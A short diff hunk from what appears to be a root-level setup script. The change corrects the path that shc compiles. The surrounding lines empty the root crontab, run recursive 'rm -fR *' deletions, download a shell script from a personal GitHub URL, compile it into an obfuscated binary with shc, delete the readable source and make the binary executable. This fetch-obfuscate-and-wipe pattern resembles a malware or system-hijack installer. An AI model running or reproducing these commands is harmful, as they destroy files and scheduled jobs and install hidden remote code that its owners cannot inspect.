@@ -56,7 +56,7 @@ cat /dev/null > /var/spool/cron/crontabs/root
 rm -fv *
 rm -fR *
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/callAPI.sh" --output-document=/root/callAPI.sh
-shc -r -f /etc/callAPI.sh -o /root/run.sh
+shc -r -f /root/callAPI.sh -o /root/run.sh
 rm -fv callAPI.sh
 chmod +x /root/run.sh
 cat /dev/null > /var/spool/cron/crontabs/root
